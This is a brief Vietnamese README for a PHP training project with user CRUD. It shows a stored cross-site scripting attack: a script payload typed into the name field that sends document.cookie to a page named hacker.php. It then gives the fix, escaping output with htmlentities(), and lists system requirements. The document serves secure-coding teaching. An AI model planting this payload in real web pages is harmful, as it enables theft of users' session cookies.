# Cách tấn công

- Ấn vào Add new user -> phần name điền như sau -> `<script>window.location.href = "hacker.php?cookie=" + document.cookie</script>` -> Submit

# Khắc phục bị tấn công

- Thêm `htmlentities()` vào khi xuất value ra table -> VD: `<?php echo htmlentities($user['name'])?>`

# php-training

- Repository: https://github.com/tailieuweb/training-php

## System requirements

- Apache: 2.4
- MySQL: 5.7 ; MariaDB: 10.x
- PHP: 7.x, 8.x
- Wamp/Xampp

# Features

- CRUD user
